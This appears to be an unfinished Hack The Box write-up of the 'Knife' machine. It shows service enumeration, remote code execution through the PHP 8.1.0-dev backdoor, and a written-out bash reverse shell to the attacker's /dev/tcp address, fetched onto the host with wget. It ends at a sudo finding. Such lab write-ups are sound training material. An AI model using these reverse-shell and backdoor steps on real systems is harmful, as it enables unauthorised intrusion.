# Introduction

[![Knife](https://www.hackthebox.eu/storage/avatars/110fe6608793064cf171080150ebd0dc.png)](https://app.hackthebox.eu/machines/347)

| Point | Description |
| :------:| :------: |
| Name | Knife |
| OS   | Linux  |
| Difficulty Rating| Easy   |
| Release | 22 May 2021   |
| IP | 10.10.10.242   |
| Owned | 31 May 2021 |

# Short retelling
* Find vulearable version of CMS
* 

# Enumeration

## Nmap

Recon host 10.10.10.242 with nmap. Add knife.htb to /etc/hosts

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# nmap -sV -A -p- --min-rate 5000 10.10.10.242                                                                                                                                                                                     130 ⨯
Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-01 21:40 EDT
Nmap scan report for knife.htb (10.10.10.242)
Host is up (0.13s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=6/1%OT=22%CT=1%CU=35740%PV=Y%DS=2%DC=T%G=Y%TM=60B6E1CC
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10D%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M54BST11NW7%O2=M54BST11NW7%O3=M54BNNT11NW7%O4=M54BST11NW7%O5=M54BST11
OS:NW7%O6=M54BST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M54BNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 554/tcp)
HOP RTT       ADDRESS
1   205.68 ms 10.10.16.1
2   94.97 ms  knife.htb (10.10.10.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.91 seconds
```

Ports 80 and 22 are open

Let's check http://knife.htb

![](https://github.com/Pash3nlee/HackTheBox/raw/main/images/k1.PNG)

And we see just one page without links.

## ffuf

Let's enumerate directories and sub domains

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# ffuf -w /usr/share/SecLists/Discovery/Web-Content/big.txt -u http://knife.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -t 100

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://knife.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/Web-Content/big.txt
 :: Extensions       : php txt htm html phtml js zip rar tar 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccessphp            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesszip            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccessjs             [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccessphtml          [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesshtm            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesstxt            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesshtml           [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccessrar            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htaccesstar            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdphp            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdtxt            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdhtm            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdphtml          [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdhtml           [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdjs             [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdzip            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdrar            [Status: 403, Size: 274, Words: 20, Lines: 10]
.htpasswdtar            [Status: 403, Size: 274, Words: 20, Lines: 10]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10]
:: Progress: [204750/204750] :: Job [1/1] :: 818 req/sec :: Duration: [0:03:57] :: Errors: 0 ::
```

And no results, let's check subdomains

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://knife.htb/ -H "Host:FUZZ.knife.htb" -fw 646

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.0-git
________________________________________________

 :: Method           : GET
 :: URL              : http://knife.htb/
 :: Wordlist         : FUZZ: /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.knife.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 646
________________________________________________

:: Progress: [114441/114441] :: Job [1/1] :: 387 req/sec :: Duration: [0:05:30] :: Errors: 0 ::
```

Ok still no info... Checking source code and don't get result too...

## CMSmap

Let's check what cms is used

```
┌──(root💀kali)-[/home/kali/HTB/knife/CMSmap]
└─# python3 cmsmap.py http://knife.htb/        
[-] Date & Time: 01/06/2021 23:03:28
[-] wordpress git repo has not been found. Cloning...
Cloning into '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/wordpress'...
remote: Enumerating objects: 351622, done.
remote: Counting objects: 100% (3062/3062), done.
remote: Compressing objects: 100% (1059/1059), done.
remote: Total 351622 (delta 2113), reused 2867 (delta 1966), pack-reused 348560
Receiving objects: 100% (351622/351622), 285.12 MiB | 979.00 KiB/s, done.
Resolving deltas: 100% (283305/283305), done.
Updating files: 100% (3032/3032), done.
[-] joomla git repo has not been found. Cloning...
Cloning into '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/joomla'...
fatal: unable to access 'https://github.com/joomla/joomla-cms/': Operation timed out after 300009 milliseconds with 0 out of 0 bytes received
[-] drupal git repo has not been found. Cloning...
Cloning into '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/drupal'...
remote: Enumerating objects: 804728, done.
remote: Counting objects: 100% (10964/10964), done.
remote: Compressing objects: 100% (6556/6556), done.
remote: Total 804728 (delta 5483), reused 8128 (delta 4094), pack-reused 793764
Receiving objects: 100% (804728/804728), 242.07 MiB | 1.18 MiB/s, done.
Resolving deltas: 100% (561329/561329), done.
Updating files: 100% (16445/16445), done.
[-] moodle git repo has not been found. Cloning...
Cloning into '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/moodle'...
remote: Enumerating objects: 1229106, done.
remote: Counting objects: 100% (4/4), done.
remote: Compressing objects: 100% (4/4), done.
remote: Total 1229106 (delta 0), reused 0 (delta 0), pack-reused 1229102
Receiving objects: 100% (1229106/1229106), 554.99 MiB | 1.47 MiB/s, done.
Resolving deltas: 100% (869202/869202), done.
Updating files: 100% (22118/22118), done.
[-] Updating wordpress versions
[-] Updating joomla versions
fatal: cannot change to '/home/kali/HTB/knife/CMSmap/cmsmap/tmp/joomla': No such file or directory
[-] Updating drupal versions
[-] Updating moodle versions
[-] Updating wordpress default files
[-] Updating wordpress default folders
[-] Updating joomla default files
find: ‘/home/kali/HTB/knife/CMSmap/cmsmap/tmp/joomla’: No such file or directory
[-] Updating joomla default folders
find: ‘/home/kali/HTB/knife/CMSmap/cmsmap/tmp/joomla’: No such file or directory
[-] Updating drupal default files
[-] Updating drupal default folders
[-] Updating moodle default files
[-] Updating moodle default folders
[I] Threads: 5
[-] Target: http://knife.htb (10.10.10.242)
[M] Website Not in HTTPS: http://knife.htb
[L] X-Frame-Options: Not Enforced
[I] Strict-Transport-Security: Not Enforced
[I] X-Content-Security-Policy: Not Enforced
[I] X-Content-Type-Options: Not Enforced
[L] No Robots.txt Found
[ERROR] CMS detection failed :(
[ERROR] Use -f to force CMSmap to scan (W)ordpress, (J)oomla or (D)rupal
```

And no results too.

## nikto

Let's run web scanner to find something

```
┌──(root💀kali)-[/home/kali/HTB/knife/CMSmap]
└─# nikto --url http://knife.htb/
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.242
+ Target Hostname:    knife.htb
+ Target Port:        80
+ Start Time:         2021-06-02 00:42:29 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.41 (Ubuntu)
+ Retrieved x-powered-by header: PHP/8.1.0-dev
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ 7786 requests: 0 error(s) and 5 item(s) reported on remote host
+ End Time:           2021-06-02 00:56:19 (GMT-4) (830 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested


      *********************************************************************
      Portions of the server's headers (Apache/2.4.41) are not in
      the Nikto 2.1.6 database or are newer than the known string. Would you like
      to submit this information (*no server specific data*) to CIRT.net
      for a Nikto update (or you may email to sullo@cirt.net) (y/n)? y

+ The site uses SSL and the Strict-Transport-Security HTTP header is not defined.
+ ERROR:  -> 
+ ERROR: Update failed, please notify sullo@cirt.net of the previous line.
```

## whatweb

Ok we have nothing, so try to find exolits for verion of services apache, openssh and php.

```
──(root💀kali)-[/home/kali/HTB/knife]
└─# whatweb http://knife.htb/
http://knife.htb/ [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.242], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

Use google and we find the [article](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/) about exploit for srvice *PHP/8.1.0-dev*

* [PHP 8.1.0-dev Backdoor Remote Code Execution](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)

# Explotation

Download exploit and we get rce from user james

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# python3 backdoor_php_8.1.0-dev.py 
Enter the host url:
http://knife.htb/

Interactive shell is opened on http://knife.htb/ 
Can't acces tty; job crontol turned off.
$ id
uid=1000(james) gid=1000(james) groups=1000(james)
```

And get **user.txt** fast

```
$ ls /home/james
user.txt

$ cat /home/james/user.txt
94afe29bfc6c076baa8ac7bbbe97bfe7

```

# Privilege Escalation

We need to upgrade shell to get privilelege escalation.

Let's upload nash reverse shell to the host

Reverse shell:

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# ip a | grep tun
5: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UNKNOWN group default qlen 500
    inet 10.10.16.4/22 scope global tun0
                                                                                                                                                                                                                                           
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# cat pasha.sh 
bash -i >& /dev/tcp/10.10.16.4/5555 0>&1
```
Run http server and download reverse shell

```
$ wget http://10.10.16.4:8000/pasha.sh -O /tmp/pasha.sh

$ ls /tmp
bundler
hsperfdata_opscode
pasha.sh
snap.lxd
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-apache2.service-Xm2nli
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-logind.service-MeT3Xe
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-resolved.service-mHnYUf
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-timesyncd.service-20HZnj
vmware-root_722-2966037965
```

Start listener and run shell and we get reverse shell

```
┌──(root💀kali)-[/home/kali/HTB/knife]
└─# nc -lvp 5555 
listening on [any] 5555 ...
connect to [10.10.16.4] from knife.htb [10.10.10.242] 51254
bash: cannot set terminal process group (956): Inappropriate ioctl for device
bash: no job control in this shell
james@knife:/$ 
```

At first upgrade reverse shell and dowload linpeas.sh

```
james@knife:/$ python3 -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
james@knife:/$ cd /tmp
cd /tmp
james@knife:/tmp$ wget http://10.10.16.4:8000/linpeas.sh
wget http://10.10.16.4:8000/linpeas.sh
--2021-06-02 05:32:42--  http://10.10.16.4:8000/linpeas.sh
Connecting to 10.10.16.4:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 325975 (318K) [text/x-sh]
Saving to: ‘linpeas.sh’

linpeas.sh          100%[===================>] 318.33K   307KB/s    in 1.0s    

2021-06-02 05:32:44 (307 KB/s) - ‘linpeas.sh’ saved [325975/325975]

james@knife:/tmp$ ls
ls
bundler
hsperfdata_opscode
linpeas.sh
pasha.sh
snap.lxd
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-apache2.service-Xm2nli
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-logind.service-MeT3Xe
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-resolved.service-mHnYUf
systemd-private-d3ba484081d24cc283e4fc7aa9b8c8b1-systemd-timesyncd.service-20HZnj
vmware-root_722-2966037965
```

Run linpeas.. In the report we find

```
[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid                                                                                                                                                              
Matching Defaults entries for james on knife:                                                                                                                                                                                              
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

We can run application *knife* from root without password

What is [knife](https://docs.chef.io/workstation/knife/)?

>Knife is a command-line tool that provides an interface between a local chef-repo and the Chef Infra Server. knife helps users to manage.

# Resources

1. 
